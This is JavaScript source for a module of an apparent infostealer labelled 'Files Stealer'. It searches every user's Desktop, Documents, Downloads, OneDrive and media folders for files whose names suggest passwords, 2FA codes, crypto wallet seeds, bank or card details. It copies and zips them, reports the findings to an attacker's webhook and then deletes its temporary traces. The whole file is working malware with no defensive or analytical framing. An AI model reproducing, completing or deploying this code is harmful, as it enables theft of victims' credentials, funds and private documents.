const fs = require('fs/promises');
const path = require('path');
const os = require('os');

const requests = require('./../../utils/requests/requests.js');
const fileutil = require('./../../utils/fileutil/fileutil.js');
const hardware = require('./../../utils/hardware/hardware.js');

const keywords = [
    "compte", "token", "credit", "card", "mail", "address", "phone",
    "crypto", "exodus", "atomic", "auth", "mfa", "2fa", "code", "memo",
    "password", "secret", "mdp", "motdepass", "mot_de_pass", "login",
    "account", "paypal", "banque", "seed", "bancaire", "bank", "metamask", "wallet",
    "permis", "number", "backup", "database", "config",
];

const extensions = [
    ".png", ".gif", ".webp", ".mp4", ".txt", ".log", ".doc", ".docx", 
    ".xls", ".xlsx", ".ppt", ".pptx",".odt", ".pdf", ".rtf", ".json", 
    ".csv", ".db", ".jpg", ".jpeg",
];

const isMatchingFile = (fileName) => {
    const lowerCaseName = fileName.toLowerCase();
    return keywords.some(keyword => lowerCaseName.includes(keyword)) &&
        extensions.some(extension => lowerCaseName.endsWith(extension));
};

const randString = (length) => {
    const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    return Array.from({ length }, () => charset[Math.floor(Math.random() * charset.length)]).join('');
};

const searchFiles = async (dir, commonFilesTempDir, foundExtensions) => {
    try {
        const files = await fs.readdir(dir);
        const tasks = files.map(async (file) => {
            const filePath = path.join(dir, file);
            const info = await fs.stat(filePath);

            if (info.isFile() && info.size <= 2 * 1024 * 1024 && isMatchingFile(file)) {
                const userDir = path.join(commonFilesTempDir, path.basename(dir));
                await fs.mkdir(userDir, { recursive: true });
                const dest = path.join(userDir, `${randString(4)}_${file}`);

                await fileutil.copy(filePath, dest);
                foundExtensions.add(path.extname(file).toLowerCase());
            } else if (info.isDirectory()) {
                await searchFiles(filePath, commonFilesTempDir, foundExtensions);
            }
        });

        await Promise.all(tasks);
    } catch (error) {
    }
};

module.exports = async (webhookUrl) => {
    const foundExtensions = new Set();
    const users = await hardware.getUsers();

    for (const user of users) {
        const commonFilesTempDir = path.join(os.tmpdir(), `commonfiles-temp`);
        const destcommonFiles = path.join(commonFilesTempDir, user.split(path.sep)[2]);

        if (!(await fs.access(destcommonFiles).then(() => true).catch(() => false))) {
            await fs.mkdir(destcommonFiles, { recursive: true });
        }

        const directories = [
            path.join(user, 'Desktop'),
            path.join(user, 'Downloads'),
            path.join(user, 'Documents'),
            path.join(user, 'Videos'),
            path.join(user, 'Pictures'),
            path.join(user, 'Music'),
            path.join(user, 'OneDrive')
        ];

        for (const dir of directories) {
            const dirStats = await fs.stat(dir).catch(() => null);
            if (dirStats && dirStats.isDirectory()) {
                await searchFiles(dir, destcommonFiles, foundExtensions);
            }
        }

        const commonFilesTempZip = path.join(os.tmpdir(), 'commonfiles.zip');

        try {
            await fileutil.zipDirectory({
                inputDir: commonFilesTempDir,
                outputZip: commonFilesTempZip
            });
        
            await requests.webhook(webhookUrl, {
                embeds: [{
                    title: 'Files Stealer',
                    description: '```' + fileutil.tree(commonFilesTempDir) + '```',
                    fields: [
                        { name: 'Extensions Found', value: '`' + [...foundExtensions].join(', ') + '`' }
                    ]
                }]
            });

            const WishTempDir = fileutil.WishTempDir('commonfiles');
            await fileutil.copy(commonFilesTempDir, WishTempDir);

            [commonFilesTempDir, commonFilesTempZip].forEach(async dir => {
                await fileutil.removeDir(dir);
            });
        } catch (error) {
            console.error(error);
        }
    }
};